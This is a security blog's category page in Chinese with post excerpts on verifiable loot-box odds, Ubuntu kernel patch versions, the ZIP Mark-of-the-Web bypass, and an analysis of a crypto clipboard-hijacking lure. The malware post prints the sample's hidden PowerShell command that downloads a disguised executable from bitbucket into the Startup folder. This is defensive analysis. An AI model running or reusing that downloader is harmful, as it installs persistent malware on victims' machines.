<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Category: 雜談 - 歐欸利恩的部落格</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="歐欸利恩的部落格"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="歐欸利恩的部落格"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="歐欸利恩的部落格"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="歐欸利恩的部落格"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://oalieno.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"歐欸利恩的部落格","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"歐欸利恩的部落格","logo":{"@type":"ImageObject","url":{"text":"歐欸利恩的部落格","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="歐欸利恩的部落格" height="28"><p>歐欸利恩的部落格</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首頁</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分類</a><a class="navbar-item" href="/tags">標籤</a><a class="navbar-item" href="/about">關於我</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">Categories</a></li><li><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></li><li class="is-active"><a href="#" aria-current="page">雜談</a></li></ul></nav></div></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2023-10-28T16:00:00.000Z" title="10/29/2023, 12:00:00 AM">2023-10-29</time></span><i class="material-icons">schedule</i><span class="level-item">14 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/10/29/gashapon/">【Paper 解讀】打造公平的遊戲轉蛋：在不洩漏原始碼的前提下驗證虛擬轉蛋的機率</a></h1><div class="content"><p>這篇是 <a target="_blank" rel="noopener" href="https://hitcon.org/2023/CMT/agenda/1e5ff161-1857-4327-b3a5-c1b7892449d5/">HITCON CMT 2023 的演講</a><br>
今天就來解讀一下這篇在講什麼。我在現場聽的時候，被突如其來的數學打得頭昏眼花，事後看懂才寫了這篇xD</p>
<h1>背景</h1>
<p>丁特事件中，遊戲橘子公告的機率與實際上抽的機率不符合，但消費者又無法驗證，所以作者就想知道能不能設計出一個，可以在不開源的情況下驗證官方公告的機率是否為真的系統。以下是幾個重要事件的時間線。</p>
<ul>
<li>2021/06 → 轉蛋法聯署</li>
<li>2021/08 → 丁特事件</li>
<li>2023/01 → 轉蛋法生效，參考日本、韓國的轉蛋法</li>
</ul>
<p>值得注意的是日本有限制保底抽數、金額。<br>
而大家在意的是怎麼<strong>驗證</strong>機率。</p>
<h1>Related Works</h1>
<p>這邊提到了兩篇 related works，但有一些各自的問題</p>
<ul>
<li><a href="gacha.gamelab.com.tw">gacha.gamelab.com.tw</a>
<ul>
<li>第三方驗證平台(壞掉了?)，玩家自行上傳抽獎紀錄</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.researchgate.net/publication/348794514_Bringing_transparency_and_trustworthiness_to_loot_boxes_with_blockchain_and_smart_contracts">(PDF) Bringing transparency and trustworthiness to loot boxes with blockchain and smart contracts (researchgate.net)</a>
<ul>
<li>嘗試用 smart contract 來解決這個問題，但是這樣就是 open source 了</li>
<li>而且在 smart contract 上還有 random source 的問題</li>
</ul>
</li>
</ul>
<h1>怎麼做</h1>
<p>轉蛋主要由兩個部分組成，隨機來源 + 轉蛋函式。<br>
所以要可以驗證轉蛋的機率代表我們需要，<strong>可以驗證的</strong>隨機來源 + <strong>可以驗證的</strong>轉蛋函式</p>
<h2 id="Verifiable-Random-Source">Verifiable Random Source</h2>
<h3 id="簡單作法">簡單作法</h3>
<p align="center"><img data-src="/images/gashapon-00.png" class=" lazyload"  title="Verifiable Random Source 簡單作法"></p>
<p>所有人提供一個 random number，把大家的 xor 起來<br>
但是這樣做可能會有 Last Contribution Attack，也就是最後一個人 C 可以暴力的嘗試不同的 c 值，選一個可以中獎的，等於最後一個人可以操控結果</p>
<h3 id="HeadStart">HeadStart</h3>
<p align="center"><img data-src="/images/gashapon-01.png" class=" lazyload"  title="Verifiable Random Source HeadStart 作法"></p>
<p>所以這邊他們改良了前面的作法，這個作法叫做 <a target="_blank" rel="noopener" href="https://www.ndss-symposium.org/ndss-paper/auto-draft-184/">HeadStart</a>，這也是作者同一個實驗室他們發的論文。<br>
這個作法主要改動了兩個部分</p>
<ul>
<li>把大家的 random number 做成 Merkle Tree</li>
<li>最後會經過 Verifiable Delay Function (VDF) 的運算得到最後結果</li>
</ul>
<p>做成 Merkle Tree 的主要好處是，驗證只需要 O(logN) 的時間和空間</p>
<p align="center"><img data-src="/images/gashapon-02.png" class=" lazyload"  title="Merkle Tree"></p>
<p>VDF 則是一個需要一定的時間計算，但是可以被迅速驗證 (有點像是 Blockchain 的 POC，但是 VDF 不能被 parallelized)，因為計算需要一定的時間，所以就可以避免 Last Contribution Attack</p>
<h2 id="Verifiable-Function">Verifiable Function</h2>
<p>接著有了 Verifiable Random Source 之後，我們還需要 Verifiable Function。<br>
這邊作者直接採用了一種 Zero Knowledge Proof 叫做 <a target="_blank" rel="noopener" href="https://vitalik.ca/general/2019/09/22/plonk.html">PLONK</a>。原本我們的函式長這樣 f(x) = y，那加上這個 PLONK 之後，他就會多吐出一個 proof 讓我們驗證，f(x) = y + proof。這邊其實不需要理解數學的細節，總之可以在不公開函式的情況下驗證你是用同一個函式去算出 x 的結果 y，而不是我給你輸入你才又偷偷換了另一個每次都抽不到的函式。如果真的想了解的同學可以看一下 <a target="_blank" rel="noopener" href="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">Vitalik 大神的 ZKP 系列</a>。</p>
<h1>實際的流程</h1>
<p>前面介紹了必要的元件之後，我們就可以來看實際的抽卡流程是怎麼個樣子</p>
<h2 id="Probability-Verification-Protocol">Probability Verification Protocol</h2>
<p>今天我想測一下這個遊戲的機率是不是唬爛的，我就可以發起這個驗證的流程 (沒有真的抽卡，只是模擬抽卡)。<br>
可以想像函式 f 就是一個下面這樣的函式，吃兩個參數，random source r 和遊戲參數 o。<br>
遊戲參數裡面會有像是 VIP 等級、抽卡次數等，比如抽卡次數就很有用，可以根據抽獎次數計算要不要保底。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loot</span>(<span class="params">seed, params</span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    num = random.randint(<span class="number">0</span>, <span class="number">999</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 20 抽保底</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="string">&quot;抽獎次數&quot;</span>] &gt;= <span class="number">19</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 機率 10%</span></span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/gashapon-03.png" class=" lazyload"  title="Probability Verification Protocol"></p>
<p align="center"><img data-src="/images/gashapon-04.png" class=" lazyload"  title="Probability Verification Protocol"></p>
<ol>
<li>首先，會有一個 Random Beacon 收集大家貢獻的 randomness，收集滿了之後，吐出 100 個 test data (模擬 100 次抽卡)
<ul>
<li>假設是 m = 100 的話 (方便想像)</li>
</ul>
</li>
<li>這些 test data 就會丟進去函式裡面運算，最後吐出 100 個 (抽卡結果, 證明)，這些都會放在公告欄裡面</li>
<li>最後，玩家們就可以拿 test data 和公佈欄裡面的 (抽卡結果, 證明) 去驗證函式 (透過 PLONK 的 ZKP 證明)</li>
<li>驗證正確代表函式沒有被動手腳，所以就可以直接來算算看這 100 個抽卡結果的中獎機率是多少啦
<ul>
<li>論文中還有計算說，如果官方說是 0.3 的機率，哪麼驗證出來的機率要小於多少就有很高機率他在說謊</li>
</ul>
</li>
</ol>
<h2 id="Loot-Box-Opening-Protocol">Loot Box Opening Protocol</h2>
<p>最後是真的要抽卡的時候的流程 (作者畫的圖好複雜，不貼了xD)</p>
<ul>
<li>Setup
<ul>
<li>(Server) 先算出一個 Hash Chain，然後把 <code>a_n</code> 給玩家
<ul>
<li><code>a_i = H(a_i-1)</code></li>
<li><code>a_0 -&gt; a_1 -&gt; a_2 -&gt; ... -&gt; a_n</code></li>
</ul>
</li>
</ul>
</li>
<li>以下步驟可以重複多次
<ul>
<li>Evaluation (開抽)
<ul>
<li>(Player) 隨機選一個 random 數 <code>B</code>，還有一些遊戲參數 <code>O</code> (比如 VIP 等級、抽獎次數等)，傳給 Server</li>
<li>(Server) 上次 Hash Chain 選到 <code>a_i</code>，這次就挑 <code>a_i-1</code>。 計算 random source 等於 <code>a_i-1 || B</code> (合併雙方的 random source)，帶入抽卡函式 <code>f(a_i-1 || B, O) = y + proof</code>。最後把結果 <code>(y, proof, a_i-1)</code> 傳回去給玩家</li>
</ul>
</li>
<li>Verification
<ul>
<li>(Player) 拿到 proof 可以驗證是同一個函式</li>
<li>(Player) 拿到 <code>a_i-1</code> 可以驗證 <code>H(a_i-1) = a_i</code> (代表 Server 不是隨心所欲的亂選一個隨機數而是在玩家選出 <code>B</code> 之前就已經決定好 <code>a_i-1</code> 了)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>這邊的重點其實是 Hash Chain 的部分，可以確保 Server 不是在收到玩家選的 random source <code>B</code> 之後，才挑一個抽不到卡的 random source。</p>
<h1>結論</h1>
<p>就是因為不想開源，所以才需要 ZKP，但仔細思考一下，其實 ZKP 的部分跟其他 Protocol 可以完全切開，ZKP 在這裡扮演的就是確保遊戲廠商至始至終都是用同一個函式，不會在模擬抽卡和真正抽卡的時候用不同的函式，這樣就可以用模擬抽卡來驗證機率了。把 ZKP 的部分去掉之後看，就會發現其實沒這麼複雜xD (不要上來就貼數學式RRR)</p>
<p>再來的問題就只是 Random Source 怎麼來</p>
<ul>
<li>模擬抽卡: 用 HeadStart 讓大家貢獻 Random Source</li>
<li>真的開抽: Server 和 Player 雙方各貢獻一個 Random Source，然後 Server 用 Hash Chain 來證明他在 Player 選 Random Source 之前就已經選好了，不是拿到 Player 的 Random Source 才挑的</li>
</ul>
<p>要開源的話，其實只要抽卡部分的程式碼可以開源就好了吧，這樣就完全不用 ZKP，實作就只剩 Hash Chain 那邊要實作，其他通通不需要了，模擬抽卡什麼的也不用了，都已經有 source code 看就知道機率是多少，要驗證函式的話，你只要把輸入丟進去看輸出是不是一樣的就好。</p>
<h1>References</h1>
<ul>
<li>他們的簡報: <a target="_blank" rel="noopener" href="https://hitcon.org/2023/CMT/slide/%E6%89%93%E9%80%A0%E5%85%AC%E5%B9%B3%E7%9A%84%E9%81%8A%E6%88%B2%E8%BD%89%E8%9B%8B_%E5%9C%A8%E4%B8%8D%E6%B4%A9%E6%BC%8F%E5%8E%9F%E5%A7%8B%E7%A2%BC%E7%9A%84%E5%89%8D%E6%8F%90%E4%B8%8B%E9%A9%97%E8%AD%89%E8%99%9B%E6%93%AC%E8%BD%89%E8%9B%8B%E7%9A%84%E6%A9%9F%E7%8E%87.pdf">打造公平的遊戲轉蛋_在不洩漏原始碼的前提下驗證虛擬轉蛋的機率.pdf</a></li>
<li>他們的論文: <a target="_blank" rel="noopener" href="https://tdr.lib.ntu.edu.tw/jspui/retrieve/7265a12d-07f3-4561-b163-84e3adb0168d/ntu-111-2.pdf">ntu-111-2.pdf</a></li>
<li>他們的原始碼: <a target="_blank" rel="noopener" href="https://github.com/WangJ509/LootBoxVerification">WangJ509/LootBoxVerification (github.com)</a></li>
</ul>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2023/10/29/gashapon/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2023-02-27T16:00:00.000Z" title="2/28/2023, 12:00:00 AM">2023-02-28</time></span><i class="material-icons">schedule</i><span class="level-item">6 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/02/28/ubuntu-kernel-version/">【資安小知識】Linux Kernel 出漏洞 Ubuntu 該升級哪一版?</a></h1><div class="content"><p>因為去年底出的一個新的 Kernel 漏洞 CVE-2022-47939，要幫忙檢查 Ubuntu 有沒有需要更新 Kernel，所以就寫了這篇記錄一下。</p>
<p>首先，這個漏洞在 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47939">mitre 的 cve 頁面</a> 中寫了影響的範圍是 <code>Linux kernel 5.15 through 5.19 before 5.19.2</code>，出問題的是 ksmbd 這個 kernel module，他是在 5.15 版本被引入的，所以 5.15 之前的版本就沒事，最後是在 <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cf6531d98190fa2cf92a6d8bbc8af0a4740a223c">這個 commit</a> 中修掉的，這個 commit 的 message 是 <code>ksmbd: fix use-after-free bug in smb2_tree_disconect</code>，跟在 mitre 的 cve 的敘述中寫的一樣，在頁面下方的 References 其實也可以看到這個 commit 的連結。</p>
<p>所以我們知道有問題的 Linux Kernel 版本是什麼，但是我要怎麼在 Ubuntu 上面看我的 Linux Kernel 是幾版，上網查一下或是問 chatgpt，其實就可以得到這個指令 <code>uname -r</code>，執行這個指令之後，在我的機器上給出了 <code>5.15.0-58-generic</code> 這樣的版本號，看起來是 5.15 版本，是在有漏洞的範圍裡面，但其實並沒有，因為這是 Ubuntu 自己 build 的版本號，並不是 Linux Kernel 的版本號，Ubuntu 的版本號的命名慣例是 <code>&lt;base kernel version&gt;-&lt;ABI number&gt;.&lt;upload number&gt;-&lt;flavour&gt;</code>，你會發現把剛剛的 <code>5.15.0-58-generic</code> 套在這個格式上看好像少了一個 upload number，我們可以用 <code>cat /proc/version_signature</code> 查看比較詳細的版本號，在我的機器上的結果是 <code>Ubuntu 5.15.0-58.64-generic 5.15.74</code>，分別是</p>
<ul>
<li>base kernel version: 5.15.0</li>
<li>ABI number: 58</li>
<li>upload number: 64</li>
<li>flavour: generic</li>
<li>upstream linux kernel: 5.15.74</li>
</ul>
<p>最後他還多給了一個 upstream linux kernel 的版本號。ABI number 指的是 kernel 本身開出來的 application binary interface 介面的版本號，如果你把 kernel 看成是一個後端 server，那他就是指你的 REST API 的接口，所以可能會跟 upload number 不同，因為可能兩個不同的 kernel 版本只是修了些 bug，沒有開新的 api，或是 api 的參數沒有變化，這時候這個 ABI number 就不會變。而 upload number 單純就是一個流水號，指從這個 <code>5.15.0</code> base kernel version 長出來的第幾個版本，所以我們可以看這個號碼來分辨前後順序。</p>
<p>在 <a target="_blank" rel="noopener" href="https://ubuntu.com/security/CVE-2022-47939">Ubuntu Secuity: CVE-2022-47939</a> 發布的漏洞公告中，我們可以看到他有列出他們上 patch 的版本，Ubuntu 22.04 (jammy) 的是 <code>5.15.0-53.59</code>，我們可以直接去看 <a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/+source/linux/5.15.0-53.59">Ubuntu linux source package 中 <code>5.15.0-53.59</code> 版本的 Changlog</a>，這裡我們搜尋 <code>smb2_tree_disconect</code> 就可以找到在這個版本的更新有納入 <code>v5.15.61</code> upstream linux kernel 其中修掉了這次的 CVE-2022-47939，而我的機器是 <code>5.15.0-58.64</code>，是在 <code>5.15.0-53.59</code> 後面的，所以其實我的機器的 Linux Kernel 已經有修補掉這個漏洞了。</p>
<p>總結來說，在 Ubuntu 下 <code>uname -r</code> 得到的版本號其實不能直接對應到 Linux Kernel 的版本號，Ubuntu 本身是從 Linux 分支出來的，所以自己有一個版本號，我們這次介紹了 Ubuntu 版本號各個欄位的意思，並且找到我們的版本號其實是已經有上 patch 了，這樣之後出新的漏洞就可以知道要升級到哪個版本可以修補掉漏洞。</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2023/02/28/ubuntu-kernel-version/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-11-08T16:00:00.000Z" title="11/9/2022, 12:00:00 AM">2022-11-09</time></span><i class="material-icons">schedule</i><span class="level-item">6 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/09/cve-2022-41049/">【漏洞分析】CVE-2022-41049</a></h1><div class="content"><p>11/08 Windows 的 Patch Tuesday 中修補了兩個關於 Bypass Mark-of-the-Web (MOTW) 的漏洞，分別是 CVE-2022-41049 和 CVE-2022-41091，在 <a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">Exploring ZIP Mark-of-the-Web Bypass Vulnerability (CVE-2022-41049)</a> 這篇部落格中，有詳細的分析這個漏洞的細節，也是本篇部落格主要參考的來源</p>
<p>這個漏洞最早在 6 月在 twitter 上 <a target="_blank" rel="noopener" href="https://twitter.com/wdormann/status/1544411421731160065?s=20&amp;t=mqtK57HVNPv7MghFW7e7dw">Will Dormann 的貼文中</a> 就有提及<br>
並且在 10 月就有在野外觀察到這個漏洞被利用</p>
<h2 id="Alternative-Data-Stream-ADS">Alternative Data Stream (ADS)</h2>
<p>要解釋這個漏洞之前，要先說明一下什麼是 Alternative Data Stream (ADS)<br>
ADS 是 NTFS 檔案系統的一個功能，允許一個檔案可以有多個 Stream，也就是雖然檔名是一樣的，但是透過不同的 Stream 可以存取到不同的資料<br>
比如 <code>test.txt</code> 這個檔案可以有好幾種不同的 Stream</p>
<ul>
<li><code>test.txt::$DATA</code></li>
<li><code>test.txt:Zone.Identifier</code></li>
<li><code>test.txt:Hello</code></li>
<li><code>test.txt:World</code></li>
</ul>
<h2 id="MOTW">MOTW</h2>
<p>瀏覽器會把從網路下載下來的檔案，新增一個 <code>Zone.Identifier</code> 的 Stream，這就是傳說中的 Mark-of-the-Web (MOTW)<br>
我們可以用 Powershell 下指令 <code>Get-Item &lt;filename&gt; -Stream *</code> 來列出某個檔案的所有 Stream 如下圖所示</p>
<p align="center"><img data-src="/images/MOTW.png" class=" lazyload"  title="MOTW"></p>
<p>接著用 <code>Get-Content &lt;filename&gt; -Stream Zone.Identifier</code> 去印出 <code>Zone.Identifier</code> Stream 裡面的資料如下圖所示</p>
<p align="center"><img data-src="/images/Get-Zone-Identifier.png" class=" lazyload"  title="Get-Content Zone.Identifier"></p>
<p>可以看到 <code>Zone.Identifier</code> Stream 裡面存了 <code>ZoneId</code> 和 <code>HostUrl</code> 這些 metadata</p>
<p>那有 MOTW 的檔案可以做什麼?<br>
有 MOTW 的檔案就等於給其他軟體們一個資訊，這個檔案是來自網路，像是 WORD, EXCEL, Visual Studio 等軟體以及 Windows 本身，在處理這些檔案的時候就會格外小心，並且對使用者發出額外的警告，像是如下圖的這些警告</p>
<p align="center"><img data-src="/images/MOTW-Warning.png" class=" lazyload"  title="MOTW Warning"></p>
<h2 id="CVE-2022-41049">CVE-2022-41049</h2>
<p>背景知識都補充足夠了，那這個 CVE-2022-41049 的漏洞又是出了什麼問題<br>
正常情況中，檔案總管 (Explorer) 在解壓縮 zip 的時候，會把 zip 檔案的 MOTW 複製到解壓縮出來的所有檔案上面<br>
但是只要那個 zip 檔案是用某個特別的方法製作的時候，MOTW 就不會被傳遞下去，也就成功 Bypass MOTW</p>
<p>這個特別的製作方法，說起來也不是那麼特別，其實也是正常的 feature<br>
<strong>只要你的檔案在壓縮的時候是 read-only 的</strong><br>
<strong>在解壓縮的時候，因為檔案是 read-only 的關係，所以檔案總管就無法去寫入 MOTW 到解壓縮出的檔案上面</strong><br>
就是這麼簡單，非常簡單就可以實作</p>
<p>這篇 <a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">Exploring ZIP Mark-of-the-Web Bypass Vulnerability (CVE-2022-41049)</a> 部落格中，作者做了非常深入的調查，最後才發現只是這麼簡單的原因，原文分析的思路也推薦大家可以看看<br>
除了 zip，其他的打包格式比如 iso, vhd, gzip 等，也是新的 bypass MOTW 的方法<br>
整體來看，Mark-of-the-Web (MOTW) 其實不算是一個 Security Boundary，比較像是一個額外的警告功能，使用者在下載網路上的資源的時候還是要謹慎小心，多看幾眼xD</p>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://breakdev.org/zip-motw-bug-analysis/">https://breakdev.org/zip-motw-bug-analysis/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/154096">https://www.ithome.com.tw/news/154096</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/11/09/cve-2022-41049/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-08-15T16:00:00.000Z" title="8/16/2020, 12:00:00 AM">2020-08-16</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/%E9%9B%9C%E8%AB%87/">雜談</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/08/16/clipboard-hijack/">【手拆 Malware】Clipboard hijacking cryptocurrency malware on tradingview.com</a></h1><div class="content"><p>最近在 <a target="_blank" rel="noopener" href="http://tradingview.com">tradingview.com</a> 上面看到這篇 Idea <a target="_blank" rel="noopener" href="https://www.tradingview.com/chart/EOSUSDT/SDsMZhix-EOS-footprints-of-institutional-money/">EOS - footprints of institutional money</a>，看起來像是正常的分析趨勢走向的 Idea，但是下面留言有一個連結 <code>mycryptorush.com/signals</code>，說是可以得到免費的 bitcoin 和交易趨勢訊號。</p>
<p align="center"><img data-src="/images/clipboard-hijack-1.png" class=" lazyload"  title="tradingview idea"></p>
<p>點下去其實是導向 <code>tinyurl.com/cryptorushsignals</code>，這個短網址又是導向 <code>https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...</code>，會下載 <code>CryptoRushSignals.zip</code> 下來。看起來就很可疑，明明看起來是要去一個網站，卻載了檔案下來。解壓縮該 zip 檔之後有兩個檔案 <code>HOWTOUSE.txt</code> 和 <code>CryptoRushSignals.run.lnk</code>。</p>
<figure class="highlight plaintext"><figcaption><span>HOWTOUSE.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open CryptoRushSignals.run, this will open up a website were you can register.</span><br><span class="line">It then automatically will open up an excel sheet with the live current signals.</span><br></pre></td></tr></table></figure>
<p>純文字的說明文件，叫你執行 <code>CryptoRushSignals.run</code>，真的去執行之後，會跳出瀏覽器瀏覽 <code>https://t.me/MyCryptoradar</code>，讓你加入一個 telegram 群組，就可以收到一些指標數據的變化通知，裡面現在有 400 多人。</p>
<p align="center"><img data-src="/images/clipboard-hijack-2.png" class=" lazyload"  title="tradingview idea"></p>
<p>除了打開瀏覽器叫你加群組之外，他還秘密執行了下面這段 payload</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.SecurityProtocolType</span>]::Tls12; <span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">&quot;https://t.me/MyCryptoradar; Invoke-WebRequest -Uri &quot;</span>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png<span class="string">&quot; -OutFile C:\Users\<span class="variable">$env:UserName</span>\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\pclp.exe</span></span><br></pre></td></tr></table></figure>
<p>基本上就是去 bitbucket 下載 <code>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png</code> 這個 png，然後放到開機自動執行的路徑，而且這個也不是 png，他就是一隻 PE 執行檔。</p>
<p align="center"><img data-src="/images/clipboard-hijack-3.png" class=" lazyload"  title="tradingview idea"></p>
<p>稍微看一下那隻 PE 執行檔後，發現他是用 py2exe 包的，那就用 <a target="_blank" rel="noopener" href="https://github.com/matiasb/unpy2exe">unpy2exe</a> 拆回 pyc，再用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6">uncompyle6</a> 就可以拆出原本的 python script 了。</p>
